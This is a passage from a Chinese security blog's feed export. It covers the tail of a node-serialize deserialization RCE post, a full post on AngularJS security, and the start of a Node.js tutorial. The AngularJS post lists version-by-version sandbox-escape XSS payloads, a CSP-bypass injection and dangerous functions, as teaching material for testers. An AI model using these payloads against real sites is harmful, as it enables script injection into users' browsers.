src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p><p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p><p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p><p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>浅析AngularJS安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90AngularJS%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析AngularJS安全/</id>
    <published>2020-03-29T04:36:28.000Z</published>
    <updated>2020-03-29T11:03:24.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01基本概念"><a href="#0x01基本概念" class="headerlink" title="0x01基本概念"></a>0x01基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>AngularJS是一个JavaScript框架，是以一个JavaScript文件形式发布的，可通过<code>&lt;script&gt;</code>标签添加到HTML页面（通过指令扩展了HTML，且通过表达式绑定数据到HTML）。</p><p>通过<code>&lt;script&gt;</code>标签引入AngularJS的JS文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.angularjs.org/1.4.0/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各个版本的angular.js下载： <a href="https://github.com/angular/angular.js/releases" target="_blank" rel="noopener">https://github.com/angular/angular.js/releases</a></p><p>在线版本：<a href="https://code.angularjs.org/" target="_blank" rel="noopener">https://code.angularjs.org/</a></p><p>AngularJS使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。</p><ul><li>AngularJS把应用程序数据绑定到HTML元素。</li><li>AngularJS可以克隆和重复HTML元素。</li><li>AngularJS可以隐藏和显示HTML元素。</li><li>AngularJS可以在HTML元素”背后”添加代码。</li><li>AngularJS支持输入验证。</li></ul><h3 id="AngularJS指令"><a href="#AngularJS指令" class="headerlink" title="AngularJS指令"></a>AngularJS指令</h3><p>AngularJS通过被称为指令的新属性来扩展HTML，通过内置的指令来为应用添加功能，并且允许你自定义指令。</p><p>AngularJS指令是带有前缀<code>ng-</code>，几个常见指令如下：</p><ul><li>ng-app指令定义一个AngularJS应用程序。</li><li>ng-model指令把元素值（比如输入域的值）绑定到应用程序。</li><li>ng-bind指令把应用程序数据绑定到HTML视图。</li><li>ng-init指令初始化应用程序数据。</li></ul><h3 id="AngularJS表达式"><a href="#AngularJS表达式" class="headerlink" title="AngularJS表达式"></a>AngularJS表达式</h3><p>AngularJS使用表达式把数据绑定到HTML，其中AngularJS表达式是写在双大括号内的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;</span><br></pre></td></tr></table></figure><p>AngularJS表达式把数据绑定到HTML，这与ng-bind指令有异曲同工之妙。</p><p>AngularJS将在表达式书写的位置”输出”数据。</p><p><strong>与JavaScript表达式的异同点：</strong></p><ul><li>类似于JavaScript表达式，AngularJS表达式可以包含字母，操作符，变量。</li><li>与JavaScript表达式不同，AngularJS表达式可以写在HTML中。</li><li>与JavaScript表达式不同，AngularJS表达式不支持条件判断，循环及异常。</li><li>与JavaScript表达式不同，AngularJS表达式支持过滤器。</li></ul><h3 id="AngularJS应用"><a href="#AngularJS应用" class="headerlink" title="AngularJS应用"></a>AngularJS应用</h3><p>AngularJS模块（Module）定义了AngularJS应用。</p><p>AngularJS控制器（Controller）用于控制AngularJS应用。</p><p>ng-app指令指明了应用，ng-controller指明了控制器。</p><p>ng-app指令位于应用的根元素下。对于单页Web应用（single page web application，SPA），应用的根通常为html元素。</p><p>一个或多个ng-controller指令定义了应用的控制器。每个控制器有他自己的作用域：定义的HTML元素。</p><p>AngularJS在HTML DOMContentLoaded事件中自动开始。如果找到ng-app指令，AngularJS载入指令中的模块，并将ng-app作为应用的根进行编译。应用的根可以是整个页面，或者页面的一小部分，如果是一小部分会更快编译和执行。</p><h3 id="如何判断是否使用AngularJS"><a href="#如何判断是否使用AngularJS" class="headerlink" title="如何判断是否使用AngularJS"></a>如何判断是否使用AngularJS</h3><p>在当前页面F12打开Console，输入<code>angular.version</code>，若有返回版本信息则使用了：</p><p><img src="/2020/03/29/浅析AngularJS安全/3.png" alt=""></p><p>若未使用则会报错：</p><p><img src="/2020/03/29/浅析AngularJS安全/1.png" alt=""></p><h2 id="0x02-AngularJS沙箱逃逸"><a href="#0x02-AngularJS沙箱逃逸" class="headerlink" title="0x02 AngularJS沙箱逃逸"></a>0x02 AngularJS沙箱逃逸</h2><p>AngularJS是一个JavaScript框架，而针对JavaScript的Web攻击通常都是以XSS为主。</p><p>由于AngularJS沙箱的存在，使得在AngularJS框架下的字符都被自动转码。如果想执行XSS攻击，就需要绕过AngularJS沙箱，这里由于支持AngularJS表达式，因此存在表达式注入来绕过沙箱的风险。</p><p>对于可能存在XSS的地方，针对不同版本的angular需要输入不同的payload才能绕过沙箱执行XSS（一般需要确认输入字符未对<code>()&#39;</code>等特殊字符进行过滤）。</p><p>测试代码如下，angular-bypass.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$q = $_GET[&apos;q&apos;];</span><br><span class="line">echo htmlspecialchars($q,ENT_QUOTES);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>以下payload省略AngularJS表达式的标志符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>要验证输入点是否存在XSS，最简单的PoC为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2*3&#125;&#125;</span><br></pre></td></tr></table></figure><p>当响应页面包含”6”字符串时即可证明存在XSS，后面就是针对AngularJS沙箱的绕过。</p><p><img src="/2020/03/29/浅析AngularJS安全/2.png" alt=""></p><h3 id="lt-1-1-5-或-gt-1-6-0（无沙箱）"><a href="#lt-1-1-5-或-gt-1-6-0（无沙箱）" class="headerlink" title="&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）"></a>&lt;=1.1.5 或 &gt;=1.6.0（无沙箱）</h3><p>在1.1.5版本以前是还未存在沙箱的，因此能直接触发。而由于不断被绕过沙箱，在1.6.0以后的版本，官方干脆将沙箱都给撤掉了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor.constructor(&apos;alert(1)&apos;)()</span><br><span class="line">或</span><br><span class="line">[].pop.constructor(&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/4.png" alt=""></p><p><img src="/2020/03/29/浅析AngularJS安全/5.png" alt=""></p><h3 id="1-2-0-1-2-18"><a href="#1-2-0-1-2-18" class="headerlink" title="1.2.0 - 1.2.18"></a>1.2.0 - 1.2.18</h3><p>当然，下面这个payload在无沙箱的版本中也能成功执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/6.png" alt=""></p><h3 id="1-2-2-1-2-5"><a href="#1-2-2-1-2-5" class="headerlink" title="1.2.2 - 1.2.5"></a>1.2.2 - 1.2.5</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="1-2-1-1-2-18"><a href="#1-2-1-1-2-18" class="headerlink" title="1.2.1 - 1.2.18"></a>1.2.1 - 1.2.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(_=&apos;&apos;.sub).call.call(&#123;&#125;[$=&apos;constructor&apos;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/7.png" alt=""></p><h3 id="1-2-19-1-2-23"><a href="#1-2-19-1-2-23" class="headerlink" title="1.2.19 - 1.2.23"></a>1.2.19 - 1.2.23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/8.png" alt=""></p><h3 id="1-2-24-1-2-26"><a href="#1-2-24-1-2-26" class="headerlink" title="1.2.24 -1.2.26"></a>1.2.24 -1.2.26</h3><p>1.1.5以下版本的是ok的，但是和网上说的1.2.24 -1.2.26版本的测试却没有弹框。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;]=constructor.getOwnPropertyDescriptor;</span><br><span class="line">g=&#123;&#125;[[&apos;__proto__&apos;]][&apos;x&apos;];</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;]=g(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;]=constructor.defineProperty;</span><br><span class="line">d=&#123;&#125;[[&apos;__proto__&apos;]][&apos;z&apos;];</span><br><span class="line">d(&apos;&apos;.sub[[&apos;__proto__&apos;]],&apos;constructor&apos;,&#123;value:false&#125;);</span><br><span class="line">&#123;&#125;[[&apos;__proto__&apos;]][&apos;y&apos;].value(&apos;alert(1)&apos;)();</span><br></pre></td></tr></table></figure><h3 id="1-2-24-1-2-29"><a href="#1-2-24-1-2-29" class="headerlink" title="1.2.24 - 1.2.29"></a>1.2.24 - 1.2.29</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;$eval(&quot;x=&apos;\&quot;+(y=&apos;if(!window\\u002ex)alert(window\\u002ex=1)&apos;)+eval(y)+\&quot;&apos;&quot;);</span><br></pre></td></tr></table></figure><h3 id="lt-1-2-5-或-1-2-20-1-3-20"><a href="#lt-1-2-5-或-1-2-20-1-3-20" class="headerlink" title="&lt;=1.2.5 或 1.2.20 - 1.3.20"></a>&lt;=1.2.5 或 1.2.20 - 1.3.20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.&quot;)));alert(1)//&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/9.png" alt=""></p><h3 id="1-3-0-1-3-18"><a href="#1-3-0-1-3-18" class="headerlink" title="1.3.0 - 1.3.18"></a>1.3.0 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=&apos;&apos;.valueOf;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/10.png" alt=""></p><h3 id="1-3-3-1-3-18"><a href="#1-3-3-1-3-18" class="headerlink" title="1.3.3 - 1.3.18"></a>1.3.3 - 1.3.18</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;[&#123;toString:[].join,length:1,0:&apos;__proto__&apos;&#125;].assign=[].join;</span><br><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/11.png" alt=""></p><h3 id="1-3-3-1-3-19"><a href="#1-3-3-1-3-19" class="headerlink" title="1.3.3 - 1.3.19"></a>1.3.3 - 1.3.19</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;[&#123;toString:false,valueOf:[].join,length:1,0:&apos;__proto__&apos;&#125;].charAt=[].join;</span><br><span class="line">$eval(&apos;x=alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/12.png" alt=""></p><h3 id="1-4-0-1-4-5（仅Chrome）"><a href="#1-4-0-1-4-5（仅Chrome）" class="headerlink" title="1.4.0 - 1.4.5（仅Chrome）"></a>1.4.0 - 1.4.5（仅Chrome）</h3><p>本地测试failed。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-1-5-8（仅Chrome和IE）"><a href="#1-4-2-1-5-8（仅Chrome和IE）" class="headerlink" title="1.4.2 - 1.5.8（仅Chrome和IE）"></a>1.4.2 - 1.5.8（仅Chrome和IE）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/13.png" alt=""></p><h3 id="1-4-0-1-4-9"><a href="#1-4-0-1-4-9" class="headerlink" title="1.4.0 - 1.4.9"></a>1.4.0 - 1.4.9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/14.png" alt=""></p><h3 id="1-3-3-1-5-8"><a href="#1-3-3-1-5-8" class="headerlink" title="1.3.3 - 1.5.8"></a>1.3.3 - 1.5.8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x[&apos;y&apos;].charAt=[].join;$eval(&apos;x=alert(1)&apos;);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/15.png" alt=""></p><h3 id="1-4-10-1-6-2"><a href="#1-4-10-1-6-2" class="headerlink" title="1.4.10 - 1.6.2"></a>1.4.10 - 1.6.2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c=&apos;&apos;.sub.call;</span><br><span class="line">b=&apos;&apos;.sub.bind;</span><br><span class="line">a=&apos;&apos;.sub.apply;</span><br><span class="line">c.$apply=$apply;</span><br><span class="line">c.$eval=b;</span><br><span class="line">op=$root.$$phase;</span><br><span class="line">$root.$$phase=null;</span><br><span class="line">od=$root.$digest;</span><br><span class="line">$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">C=c.$apply(c);</span><br><span class="line">$root.$$phase=op;</span><br><span class="line">$root.$digest=od;</span><br><span class="line">B=C(b,c,b);</span><br><span class="line">$evalAsync(&quot;</span><br><span class="line">astNode=pop();</span><br><span class="line">astNode.type=&apos;UnaryExpression&apos;;</span><br><span class="line">astNode.operator=&apos;(window.X?void0:(window.X=true,alert(1)))+&apos;;</span><br><span class="line">astNode.argument=&#123;type:&apos;Identifier&apos;,name:&apos;foo&apos;&#125;;</span><br><span class="line">&quot;);</span><br><span class="line">m1=B($$asyncQueue.pop().expression,null,$root);</span><br><span class="line">m2=B(C,null,m1);</span><br><span class="line">[].push.apply=m2;</span><br><span class="line">a=&apos;&apos;.sub;</span><br><span class="line">$eval(&apos;a(b.c)&apos;);</span><br><span class="line">[].push.apply=a;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/16.png" alt=""></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>第一次发布的AngularJS即 1.0 - 1.1.5 版本并没有沙箱。但AngularJS表达式被开发者限定为局部对象定义，这便阻止了在窗口对象中调用函数，由于被作用域限制，此时如果尝试调用alert会发现调用的是作用域对象而不是窗口对象，函数调用会失败。针对这种场景，Mario Heiderich发现可以使用构造函数属性来Bypass这个限制，即使用Function构造函数能在表达式中执行任意代码。</p><p>在后来的版本中AngularJS添加了沙箱，但是对应的每个版本的沙箱都被Bypass，以至于AngularJS在1.6版本之后完全移除了沙箱，也就是说新版本的AngularJS是不用再费劲去沙箱逃逸了。</p><h3 id="一道Bypass-CSP的题目"><a href="#一道Bypass-CSP的题目" class="headerlink" title="一道Bypass CSP的题目"></a>一道Bypass CSP的题目</h3><p>代码如下，bypass-csp.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        echo $_GET[&apos;q&apos;];</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到，整个HTML在AngularJS沙箱下，其中CSP限制script标签的脚本只能是加载code.angularjs.org域的或self的。</p><p>具体过程这里不做分析，payload如下（仅Chrome）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass-csp.php?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析AngularJS安全/17.png" alt=""></p><h2 id="0x03-AngularJS危险函数调用"><a href="#0x03-AngularJS危险函数调用" class="headerlink" title="0x03 AngularJS危险函数调用"></a>0x03 AngularJS危险函数调用</h2><p>AngularJS中一些特定功能的函数并不会对字符进行转码，因此当使用不当时可以执行JS表达式进行XSS攻击。</p><p>AngularJS危险函数列表如下，当然这里只列了最简单的，其他很多的请查阅资料：</p><table><thead><tr><th>危险函数</th><th>备注</th></tr></thead><tbody><tr><td>$eval()</td><td>会在当前作用域中执行一个表达式并返回结果</td></tr><tr><td>$parse()</td><td>将一个表达式转换为一个函数。这个函数可以被调用，其中的参数是一个上下文对象，通常来说是作用域。</td></tr><tr><td>trustAs(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>trustAsHtml(type, value)</td><td>关闭对应的$sce（strict contextual escaping）即严格的上下文逃逸限制</td></tr><tr><td>parseAsHtml(expression)</td><td>解析为HTML代码</td></tr><tr><td><code>angular.element(someElement).html(&quot;&lt;html&gt;&quot;+userContent);</code></td><td>DOM插入HTML</td></tr><tr><td>$sce.enabled(false);</td><td>关闭自动转义</td></tr><tr><td>$sceProvider.enabled(false);</td><td>关闭自动转义</td></tr></tbody></table><p>还有一种情况就是，  使用管道符时的条件外部可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; value | orderBy:userContent &#125;&#125;.filter(&apos;&apos;,function()&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x04-AngularJS安全措施"><a href="#0x04-AngularJS安全措施" class="headerlink" title="0x04 AngularJS安全措施"></a>0x04 AngularJS安全措施</h2><p>参考官网描述：<a href="https://angular.cn/guide/security" target="_blank" rel="noopener">https://angular.cn/guide/security</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.runoob.com/angularjs/angularjs-tutorial.html" target="_blank" rel="noopener">AngularJS 教程</a></p><p><a href="https://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="noopener">AngularJS沙盒逃逸姿势总结</a></p><p><a href="https://xz.aliyun.com/t/4638" target="_blank" rel="noopener">AngularJS Sandbox Bypasses</a></p><p><a href="https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss" target="_blank" rel="noopener">AngularJS - Escaping the Expression Sandbox for XSS</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="AngularJS" scheme="https://www.mi1k7ea.com/tags/AngularJS/"/>
    
  </entry>
  
  <entry>
    <title>浅析Node.js安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90Node-js%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析Node-js安全/</id>
    <published>2020-03-29T04:17:06.000Z</published>
    <updated>2020-04-01T15:45:06.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境。Node.js使用了一个事件驱动、非阻塞式I/O的模型。</p><p>Node是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。实质是对Chrome V8引擎进行了封装。</p><p>Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。</p><h3 id="环境安装、基础语法与特性"><a href="#环境安装、基础语法与特性" class="headerlink" title="环境安装、基础语法与特性"></a>环境安装、基础语法与特性</h3><p>参考：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-tutorial.html</a></p><h3 id="第一个应用"><a href="#第一个应用" class="headerlink" title="第一个应用"></a>第一个应用</h3><p>Node.js应用由以下三部分组成：</p><ol><li>引入required模块：我们可以使用require指令来载入Node.js模块。</li><li>创建服务器：服务器可以监听客户端的请求，类似于Apache、Nginx等HTTP服务器。</li><li>接收请求与响应请求：服务器很容易创建，客户端可以使用浏览器或终端发送HTTP请求，服务器接收请求后返回响应数据。</li></ol><p>直接看下代码实现，test.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入required模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送 HTTP 头部 </span></span><br><span class="line">    <span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line">    <span class="comment">// 内容类型: text/plain</span></span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送响应数据 "Mi1k7ea"</span></span><br><span class="line">    response.end(<span class="string">'Mi1k7ea\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:666/'</span>);</span><br></pre></td></tr></table></figure><p>直接用node命令运行即可：</p><p><img src="/2020/03/29/浅析Node-js安全/1.png" alt=""></p><h3 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h3><p>Express是一个简洁而灵活的Node.js Web应用框架，提供了一系列强大特性帮助你创建各种Web应用，和丰富的HTTP工具。</p><p>使用Express可以快速地搭建一个完整功能的网站。</p><p>Express框架核心特性：</p><ul><li>可以设置中间件来响应HTTP请求。</li><li>定义了路由表用于执行不同的HTTP请求动作。</li><li>可以通过向模板传递参数来动态渲染HTML页面。</li></ul><p>Express的安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br><span class="line">npm install body-parser --save</span><br><span class="line">npm install cookie-parser --save</span><br><span class="line">npm install multer 